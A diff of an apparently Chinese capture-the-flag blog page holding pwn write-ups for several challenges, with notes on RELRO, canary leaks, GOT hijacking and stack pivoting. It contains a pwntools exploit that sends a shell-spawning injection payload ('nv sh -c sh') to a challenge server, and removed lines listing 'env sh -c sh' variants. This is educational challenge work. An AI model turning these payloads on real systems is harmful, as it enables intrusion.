@@ -278,7 +278,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2024-07-10 10:53:06 / Modified: 11:02:30" itemprop="dateCreated datePublished" datetime="2024-07-10T10:53:06+08:00">2024-07-10</time>
+              <time title="Created: 2024-07-10 10:53:06 / Modified: 11:29:43" itemprop="dateCreated datePublished" datetime="2024-07-10T10:53:06+08:00">2024-07-10</time>
             </span>
 
           
@@ -292,18 +292,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="fini-arry-ciscn-2019-sw-1"><a href="#fini-arry-ciscn-2019-sw-1" class="headerlink" title="(fini.arry)ciscn_2019_sw_1"></a><code>(fini.arry)ciscn_2019_sw_1</code></h1><h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
-<li><p>对于<code>RELRO</code>保护，有以下<code>3</code>种情况：</p>
-<p><code>No RELRO</code>：<code>init.array</code>，<code>fini.array</code>，<code>got.plt</code>均可读可写</p>
-<p><code>PARTIAL RELRO</code>：<code>init.array</code>，<code>fini.array</code>可读不可写，<code>got.plt</code>可读可写</p>
-<p><code>FULL RELRO</code>：<code>init.array</code>，<code>fini.array</code>，<code>got.plt</code>均可读不可写</p>
-</li>
-<li><p>程序在加载的时候，会依次调用<code>init_arry</code>中的每一个函数指针，程序在结束的时候，会依次调用<code>fini_array</code>中的每一个函数指针，而我们可以修改其中的函数指针为<code>main</code>函数地址，使<code>main</code>函数再执行一次。一般来说，这个数组的长度为<code>1</code>，也就是说只能写一个地址。</p>
-</li>
-<li><p>有时候思路对了一直打不通，可能是参数偏移量算错了。</p>
-</li>
-</ol>
-<h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
+          <h1 id="fini-arry-ciscn-2019-sw-1"><a href="#fini-arry-ciscn-2019-sw-1" class="headerlink" title="(fini.arry)ciscn_2019_sw_1"></a><code>(fini.arry)ciscn_2019_sw_1</code></h1><h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
 <img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102700.png" alt="image-20240710110220628" style="zoom:67%;" />
 
 <p>源码：</p>
@@ -346,11 +335,7 @@
 
 <p>拿到<code>flag</code></p>
 <p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053805.png" alt="image-20240306133033057"></p>
-<h1 id="canary-linkctf-2018-7-babypie"><a href="#canary-linkctf-2018-7-babypie" class="headerlink" title="(canary)linkctf_2018.7_babypie"></a><code>(canary)linkctf_2018.7_babypie</code></h1><h2 id="学习与收获-1"><a href="#学习与收获-1" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
-<li><code>canary</code>的值的最后<code>1</code>个字节是<code>\x00</code>，是为了截断字符串，防止被连带输出，所以我们泄漏<code>canary</code>值的关键是覆盖<code>\x00</code>。</li>
-<li>我们一般泄漏的都是<code>canary</code>值的前<code>7</code>个字节，这并不是<code>canary</code>值，因为<code>\x00</code>从最后<code>1</code>个变成了第<code>1</code>个，而<code>rjust()</code>是从后面开始填充的，所以我们可以利用<code>rjust()</code>得到<code>canary</code>值。</li>
-</ol>
-<h2 id="保护-源码-1"><a href="#保护-源码-1" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
+<h1 id="canary-linkctf-2018-7-babypie"><a href="#canary-linkctf-2018-7-babypie" class="headerlink" title="(canary)linkctf_2018.7_babypie"></a><code>(canary)linkctf_2018.7_babypie</code></h1><h2 id="保护-源码-1"><a href="#保护-源码-1" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
 <img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101413.png" alt="image-20240710110101339" style="zoom:67%;" />
 
 <p>源码：</p>
@@ -375,23 +360,24 @@
 
 <p>拿到<code>flag</code></p>
 <p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053917.png" alt="image-20240309212604335"></p>
-<h1 id="交换变量值-pwnable-loveletter"><a href="#交换变量值-pwnable-loveletter" class="headerlink" title="(交换变量值)pwnable_loveletter"></a><code>(交换变量值)pwnable_loveletter</code></h1><h2 id="学习与收获-2"><a href="#学习与收获-2" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
-<li><p>溢出的另一种方法，变量替换，当替换后的变量字节数大于替换前的，便可能造成溢出。</p>
-</li>
-<li><pre><code class="bash">env /bin/sh
-env sh
-env sh -c sh
-env sh -c sh (空格后面写什么都可以，但一定要有空格)
-<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 保护&amp;源码</span><br><span class="line"></span><br><span class="line">保护：</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;https://raw.githubusercontent.com/Qwen11/picture/main/202407101059447.png&quot;</span> alt=<span class="string">&quot;image-20240710105958363&quot;</span> style=<span class="string">&quot;zoom:80%;&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">源码：</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;https://raw.githubusercontent.com/Qwen11/picture/main/202407101053109.png&quot;</span> alt=<span class="string">&quot;image-20240318121511252&quot;</span> style=<span class="string">&quot;zoom:80%;&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;https://raw.githubusercontent.com/Qwen11/picture/main/202407101053124.png&quot;</span> alt=<span class="string">&quot;image-20240318121436189&quot;</span> style=<span class="string">&quot;zoom:50%;&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">## 思路</span><br><span class="line"></span><br><span class="line">​	最开始以为程序中没有栈溢出，思路是用逻辑运算符分隔字符串执行`/bin/sh`或者其他命令，但是看到会被`protect`函数过滤。</span><br><span class="line"></span><br><span class="line">​	然后也是在这个函数中，我们发现替换后的内容比替换前多了`3`个字节，可以造成栈溢出。控制`v6`这个值为`1`，就会把`prolog=<span class="string">&quot;echo I love &quot;</span>`中的第一个字节拼接到`loveletter`中。然后我们直接写进`nv sh -c sh `拼接即可，注意这里要在最后留一个空格，因为后面还会在被拼接数据。</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">payload = b&#x27;nv sh -c sh&#x27;</span><br><span class="line">payload += b&#x27;a&#x27;*(<span class="number">253</span>-<span class="number">11</span>)+b&#x27;<span class="comment">;&#x27;+b&#x27;\x01&#x27;</span></span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ol>
+<h1 id="交换变量值-pwnable-loveletter"><a href="#交换变量值-pwnable-loveletter" class="headerlink" title="(交换变量值)pwnable_loveletter"></a><code>(交换变量值)pwnable_loveletter</code></h1><h2 id="保护-源码-2"><a href="#保护-源码-2" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059447.png" alt="image-20240710105958363" style="zoom:80%;" />
+
+<p>源码：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053109.png" alt="image-20240318121511252" style="zoom:80%;" />
+
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053124.png" alt="image-20240318121436189" style="zoom:50%;" />
+
+<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>​	最开始以为程序中没有栈溢出，思路是用逻辑运算符分隔字符串执行<code>/bin/sh</code>或者其他命令，但是看到会被<code>protect</code>函数过滤。</p>
+<p>​	然后也是在这个函数中，我们发现替换后的内容比替换前多了<code>3</code>个字节，可以造成栈溢出。控制<code>v6</code>这个值为<code>1</code>，就会把<code>prolog=&quot;echo I love &quot;</code>中的第一个字节拼接到<code>loveletter</code>中。然后我们直接写进<code>nv sh -c sh </code>拼接即可，注意这里要在最后留一个空格，因为后面还会在被拼接数据。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;nv sh -c sh&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">253</span>-<span class="number">11</span>)+<span class="string">b&#x27;;&#x27;</span>+<span class="string">b&#x27;\x01&#x27;</span></span><br></pre></td></tr></table></figure>
+
 <h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./love&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28357</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;nv sh -c sh &#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">253</span>-<span class="number">12</span>)+<span class="string">b&#x27;;&#x27;</span>+<span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>拿到<code>flag</code></p>
 <p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059332.png" alt="image-20240710105939258"></p>
 <h1 id="picoctf-2018-echo-back-格式化字符串"><a href="#picoctf-2018-echo-back-格式化字符串" class="headerlink" title="picoctf_2018_echo back(格式化字符串)"></a><code>picoctf_2018_echo back(格式化字符串)</code></h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	程序中有<code>system</code>函数，有格式化字符串漏洞，<code>RELRO</code>保护为<code>Partial RELRO</code>，可以劫持<code>printf</code>的<code>got</code>表为<code>system@plt</code>。但是只有一次<code>printf</code>，然后思路就卡在这里了。后来又想到<code>printf</code>后面还有两个<code>puts</code>，可以修改<code>puts</code>的<code>got</code>表为<code>vuln</code>的地址，然后劫持程序执行流到<code>vuln</code>函数使程序再执行一遍，便可调用<code>syatem</code>函数。</p>
-<h2 id="保护-源码-2"><a href="#保护-源码-2" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
+<h2 id="保护-源码-3"><a href="#保护-源码-3" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
 <img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053000.png" alt="image-20240323103152232" style="zoom:67%;" />
 
 <p>源码：</p>
@@ -401,16 +387,11 @@ env sh -c sh (空格后面写什么都可以，但一定要有空格)
 
 <p>拿到<code>flag</code></p>
 <p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059468.png" alt="image-20240710105915397"></p>
-<h1 id="GKCTF-2021-checkin"><a href="#GKCTF-2021-checkin" class="headerlink" title="[GKCTF 2021]checkin"></a><code>[GKCTF 2021]checkin</code></h1><h2 id="学习与收获-3"><a href="#学习与收获-3" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
-<li>我们控制程序的执行流后，可以直接控制执行流到程序中 的<code>call puts</code>指令的地址，这样我们就可以调用<code>puts</code>函数却不用自己写返回地址，因为程序中就有<code>call puts</code>后的返回地址。</li>
-<li>程序中的大量看不懂的函数，可能是某个加密或解密。</li>
-<li>有时候远程通本地不通，或者某个步骤远程程序没崩本地却崩了，极大可能是<code>libc</code>问题，即使我们的脚本中没有用到<code>libc</code>，但我们调用函数开辟栈帧的大小等也都受到<code>libc</code>的影响，所以此时把本地<code>libc</code>换成远程一样的即可。</li>
-</ol>
-<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101058647.png" alt="image-20240710105852575" style="zoom:80%;" />
+<h1 id="GKCTF-2021-checkin"><a href="#GKCTF-2021-checkin" class="headerlink" title="[GKCTF 2021]checkin"></a><code>[GKCTF 2021]checkin</code></h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101058647.png" alt="image-20240710105852575" style="zoom:80%;" />
 
 <h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053477.png" alt="image-20240328171631887"></p>
 <p>​	程序中有两次<code>read</code>，第一次是将数据写到了<code>.bss</code>段，第二次有栈溢出漏洞，可以溢出<code>8</code>个字节，我们第一时间想到栈迁移。然后是一个<code>if</code>语句，如果满足条件则执行<code>exit(0)</code>直接退出程序，所以我们要想办法跳过<code>if</code>语句使程序不执行<code>exit(0)</code>。</p>
-<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>​	首先我们要想办法绕过<code>if</code>语句，第一个很容易看出，我们写进<code>s1</code>的数据前<code>5</code>个字符必须为<code>admin</code>。但是我们点进第二个函数中，其实我是看不懂这些函数的，然后看别的师傅的<code>wp</code>发现是一个<code>md5</code>加密，也是要我们写到<code>buf</code>中的内容的前<code>5</code>个字符为<code>admin</code>。</p>
+<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>​	首先我们要想办法绕过<code>if</code>语句，第一个很容易看出，我们写进<code>s1</code>的数据前<code>5</code>个字符必须为<code>admin</code>。但是我们点进第二个函数中，其实我是看不懂这些函数的，然后看别的师傅的<code>wp</code>发现是一个<code>md5</code>加密，也是要我们写到<code>buf</code>中的内容的前<code>5</code>个字符为<code>admin</code>。</p>
 <img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053468.png" alt="image-20240328173330991" style="zoom: 80%;" />
 
 <p>​	然后我们开始往<code>.bss</code>段中写<code>rop</code>链，我们让第一个内存单元存储<code>admin</code>，以绕过<code>if</code>语句。然后这里又有一个问题，就是我们<code>read</code>只能读入<code>0x20(32)</code>个字节，而<code>b&#39;admin\x00\x00\x00&#39;+p64(pop_rdi)+p64(puts_got)</code>已经用了<code>24</code>个字节，也就是说我们写入<code>elf.plt[&#39;puts&#39;]</code>后便不能再写返回地址了，显然这是不行的。所以这里我们直接劫持程序执行流到<code>call puts</code>指令的地址，这样也达到了我们再次进行两次<code>read</code>的目的。</p>
@@ -429,8 +410,7 @@ env sh -c sh (空格后面写什么都可以，但一定要有空格)
 <img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101057676.png" alt="image-20240710105754596" style="zoom:67%;" />
 
 <p>​	最后说一下，一开始打本地一直不通并在第二次读入前程序就崩了，而打远程却通了。其实是<code>libc</code>的原因，远程的<code>libc</code>与本地的<code>libc</code>不同，一些栈帧大小也不同，所以我们把本地的<code>libc</code>换成远程的即可。</p>
-<h1 id="bbctf-2020-fmt-me"><a href="#bbctf-2020-fmt-me" class="headerlink" title="bbctf_2020_fmt_me"></a><code>bbctf_2020_fmt_me</code></h1><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>通过本题的学习与收获有：</p>
-<ol>
+<h1 id="bbctf-2020-fmt-me"><a href="#bbctf-2020-fmt-me" class="headerlink" title="bbctf_2020_fmt_me"></a><code>bbctf_2020_fmt_me</code></h1><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol>
 <li><p>在<code>gdb</code>中又学到一个查看地址中内容的命令，<code>x/s</code>以字符串的形式表示。</p>
 </li>
 <li><p>如果我们要修改<code>8</code>个字节，但是只写入<code>3</code>个或更少的字节，可以直接用<code>fmtstr_payload</code>函数，<code>fmtstr_payload</code>中的参数</p>
